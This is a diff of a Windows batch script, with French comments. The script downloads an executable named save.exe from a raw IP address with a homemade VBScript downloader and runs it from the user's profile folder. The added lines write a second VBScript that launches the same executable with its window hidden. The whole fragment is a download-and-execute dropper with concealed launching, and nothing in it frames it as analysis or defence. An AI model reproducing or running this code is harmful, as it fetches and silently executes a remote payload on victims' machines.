@@ -27,3 +27,10 @@ echo ts.Close >> wget.vbs
 cscript wget.vbs http://178.170.58.9/files/save.exe %userprofile%\save.exe
 cd %userprofile%
 save.exe
+
+
+
+#Partie pour executer le shell 
+echo Set Shell = CreateObject("WScript.Shell")  > save.vbs
+echo Shell.CurrentDirectory = Shell.ExpandEnvironmentStrings("%USERPROFILE%") >> save.vbs
+echo Shell.Run "save.exe", 0, False  >> save.vbs
